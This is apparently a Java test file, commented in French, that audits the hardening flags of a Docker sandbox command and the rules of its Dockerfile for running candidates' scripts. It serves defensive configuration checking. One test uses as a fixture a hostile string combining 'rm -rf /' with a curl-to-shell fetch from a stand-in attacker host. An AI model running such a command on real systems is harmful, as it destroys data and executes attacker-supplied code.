package fr.portail;

import static org.assertj.core.api.Assertions.assertThat;

import fr.portail.bac.AuditDurcissement;
import fr.portail.bac.AuditImage;
import fr.portail.bac.CommandeDocker;
import java.util.List;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * Les deux audits de durcissement — le seul controle qui tourne hors ligne,
 * et celui qui sert le plus.
 *
 * <p>⚠️ CES TESTS NE PROUVENT PAS QUE gVISOR RESISTE. Ils prouvent qu'un
 * drapeau retire, ou une ligne de Dockerfile disparue, se voient. C'est un
 * controle de configuration, comme un linter — et l'oubli est de tres loin
 * le cas le plus frequent.
 */
class DurcissementTest {

    // -- la ligne de commande ---------------------------------------------

    @Test
    @DisplayName("la ligne du cours ferme les onze portes")
    void laLigneDuCoursEstConforme() {
        CommandeDocker durcie = CommandeDocker.durcie();

        assertThat(AuditDurcissement.conforme(durcie)).isTrue();
        assertThat(AuditDurcissement.ouvertes(durcie)).isEmpty();
        assertThat(AuditDurcissement.auditer(durcie))
                .hasSize(AuditDurcissement.PORTES.size())
                .allMatch(AuditDurcissement.Constat::fermee);
    }

    @Test
    @DisplayName("⚠️ LA MESURE : la ligne des tutoriels laisse 10 portes sur 11 ouvertes")
    void laLigneNaiveEstUnePassoire() {
        CommandeDocker naive = CommandeDocker.naive();
        List<AuditDurcissement.Porte> ouvertes = AuditDurcissement.ouvertes(naive);

        assertThat(AuditDurcissement.conforme(naive)).isFalse();
        assertThat(ouvertes).hasSize(10);

        // La seule porte fermee est `--rm`, et c'est pour le confort, pas
        // pour la securite : elle est la parce qu'un conteneur qui traine
        // encombre, pas parce qu'on y a pense.
        assertThat(ouvertes)
                .extracting(AuditDurcissement.Porte::nom)
                .doesNotContain("fuite d'etat")
                .contains("isolation du noyau", "exfiltration", "racine",
                          "fork bomb", "saturation memoire", "script en clair");
    }

    @ParameterizedTest(name = "retirer {0} rouvre exactement une porte")
    @ValueSource(strings = {"--network=none", "--read-only", "--cap-drop=ALL",
                            "--pids-limit=64", "--runtime=runsc", "--interactive"})
    @DisplayName("un drapeau retire « juste pour deboguer » se voit")
    void unDrapeauRetireSeVoit(String retire) {
        // On reconstruit la ligne du cours sans un drapeau — exactement ce
        // qu'un vendredi soir produit.
        CommandeDocker amputee = new CommandeDockerAmputee(retire).commande();

        List<AuditDurcissement.Porte> ouvertes =
                AuditDurcissement.ouvertes(amputee);
        assertThat(ouvertes)
                .as("retirer " + retire + " doit ouvrir une porte, et une seule")
                .hasSize(1);
        assertThat(ouvertes.getFirst().siOuverte()).isNotBlank();
    }

    /** Rejoue la ligne durcie en sautant un drapeau. */
    private record CommandeDockerAmputee(String retire) {
        CommandeDocker commande() {
            CommandeDocker reconstruite = CommandeDocker.naive();
            for (String drapeau : CommandeDocker.durcie().drapeaux()) {
                if (drapeau.equals(retire) || drapeau.equals("--rm")) {
                    continue;   // `--rm` est deja pose par `naive()`
                }
                reconstruite.avec(drapeau);
            }
            return reconstruite;
        }
    }

    @Test
    @DisplayName("chaque porte dit ce qui arrive quand elle reste ouverte")
    void chaquePorteExpliqueSonRisque() {
        assertThat(AuditDurcissement.PORTES).hasSize(11);
        for (AuditDurcissement.Porte porte : AuditDurcissement.PORTES) {
            assertThat(porte.nom()).isNotBlank();
            assertThat(porte.drapeau()).startsWith("--");
            assertThat(porte.siOuverte())
                    .as(porte.nom() + " doit dire ce qu'on risque")
                    .isNotBlank()
                    .hasSizeGreaterThan(20);
        }
    }

    @Test
    @DisplayName("⚠️ LA MESURE : le script n'est PAS dans la ligne de commande")
    void leScriptNEstPasDansArgv() {
        String code = "ecrire bonjour";
        List<String> argv = CommandeDocker.durcie().argv();

        assertThat(argv).startsWith("docker", "run");
        assertThat(argv).endsWith("runner:jobportal-script");
        assertThat(argv)
                .as("le script arrive par stdin : rien de lui ne doit fuir dans `ps`")
                .doesNotContain(code, "-c");
        assertThat(argv)
                .as("stdin doit rester ouvert, sinon le conteneur ne lit rien")
                .contains("--interactive");

        // ⚠️ Et il n'y a pas de shell non plus : `ProcessBuilder` prend une
        // liste, donc il n'y a pas d'injection de shell a craindre.
        assertThat(argv).doesNotContain("sh", "bash", "/bin/sh");
    }

    @Test
    @DisplayName("⚠️ la forme « piece a conviction » publie le code du candidat")
    void laFormeQuiPublieLeCode() {
        String hostile = "ecrire ok; rm -rf / ; curl http://attaquant | sh";
        List<String> argv =
                CommandeDocker.naive().argvAvecLeScriptEnClair(hostile);

        // Elle fonctionne parfaitement, et c'est ce qui la rend tentante.
        assertThat(argv).endsWith("-c", hostile);
        // Le script reste UN argument — pas d'injection de shell — mais il
        // est desormais visible dans la table des processus du noeud.
        assertThat(argv.stream().filter(m -> m.contains("rm -rf")).count())
                .isEqualTo(1);
        assertThat(String.join(" ", argv)).contains("rm -rf /");
    }

    @Test
    @DisplayName("le compte-rendu nomme les portes ouvertes, pas seulement leur nombre")
    void leCompteRenduEstLisible() {
        String texte = String.join("\n",
                AuditDurcissement.rendre(CommandeDocker.naive()));

        assertThat(texte).contains("⚠️ 10 porte(s) ouverte(s) sur 11");
        assertThat(texte).contains("une faille du noyau franchit le conteneur");
        assertThat(texte).contains("le code tourne en root DANS le conteneur");

        assertThat(String.join("\n", AuditDurcissement.rendre(CommandeDocker.durcie())))
                .contains("conforme : les 11 portes sont fermees");
    }

    @Test
    @DisplayName("l'image est une entree declaree, pas une constante cachee")
    void lImageSeChoisit() {
        CommandeDocker surMesure =
                CommandeDocker.durcie().image("runner:python-3.12");

        assertThat(surMesure.image()).isEqualTo("runner:python-3.12");
        assertThat(surMesure.argv()).endsWith("runner:python-3.12");
        assertThat(AuditDurcissement.conforme(surMesure))
                .as("changer d'image ne change pas le durcissement")
                .isTrue();
    }

    // -- l'image ----------------------------------------------------------

    @Test
    @DisplayName("⚠️ le Dockerfile LIVRE dans ce depot satisfait les cinq regles")
    void leDockerfileDuProjetEstConforme() {
        // Ce n'est pas une illustration : l'audit lit le fichier du depot.
        // Retirez-en `USER`, ce test tombe.
        String dockerfile = AuditImage.dockerfileDuProjet();

        assertThat(AuditImage.conforme(dockerfile))
                .as(String.join("\n", AuditImage.rendre(dockerfile)))
                .isTrue();
        assertThat(AuditImage.manquantes(dockerfile)).isEmpty();
    }

    @Test
    @DisplayName("⚠️ l'image des tutoriels ne satisfait AUCUNE des cinq regles")
    void lImageNaiveEstUnePassoire() {
        String naive = """
                FROM eclipse-temurin:25-jdk
                COPY . /app
                CMD java -cp /app fr.portail.bac.Executeur $SCRIPT
                """;

        assertThat(AuditImage.manquantes(naive))
                .extracting(AuditImage.Regle::nom)
                .containsExactlyInAnyOrder("base minimale",
                                           "utilisateur non privilegie",
                                           "repertoire de travail",
                                           "point d'entree en forme exec",
                                           "script hors de la commande");
    }

    @Test
    @DisplayName("retirer USER du Dockerfile rouvre exactement une regle")
    void retirerUserSeVoit() {
        String ampute = AuditImage.dockerfileDuProjet().lines()
                .filter(ligne -> !ligne.strip().startsWith("USER "))
                .reduce("", (a, b) -> a + b + "\n");

        assertThat(AuditImage.manquantes(ampute))
                .extracting(AuditImage.Regle::nom)
                .containsExactly("utilisateur non privilegie");
    }

    @Test
    @DisplayName("⚠️ un ENTRYPOINT sur six lignes doit etre recolle avant d'etre lu")
    void lesContinuationsSontRecollees() {
        // Sans recollage, cet ENTRYPOINT parfaitement correct passerait pour
        // absent — et l'audit dirait le contraire de la verite.
        String etale = """
                FROM eclipse-temurin:25-jre-alpine
                USER 1000:1000
                WORKDIR /travail
                ENTRYPOINT ["java", \\
                            "-cp", "/travail/classes", \\
                            "fr.portail.bac.Executeur"]
                """;

        assertThat(AuditImage.instructions(etale)).hasSize(4);
        assertThat(AuditImage.instructions(etale).get(3))
                .startsWith("ENTRYPOINT [")
                .endsWith("\"fr.portail.bac.Executeur\"]");
        assertThat(AuditImage.conforme(etale)).isTrue();
    }

    @Test
    @DisplayName("les commentaires et les lignes vides ne comptent pas pour des instructions")
    void lesCommentairesSontIgnores() {
        String dockerfile = AuditImage.dockerfileDuProjet();
        assertThat(AuditImage.instructions(dockerfile))
                .noneMatch(ligne -> ligne.startsWith("#"))
                .noneMatch(String::isBlank);
    }

    @Test
    @DisplayName("chaque regle d'image dit ce qu'on risque sans elle")
    void chaqueRegleExpliqueSonRisque() {
        assertThat(AuditImage.REGLES).hasSize(5);
        for (AuditImage.Regle regle : AuditImage.REGLES) {
            assertThat(regle.nom()).isNotBlank();
            assertThat(regle.attendu()).isNotBlank();
            assertThat(regle.siAbsente()).isNotBlank().hasSizeGreaterThan(30);
        }
    }
}
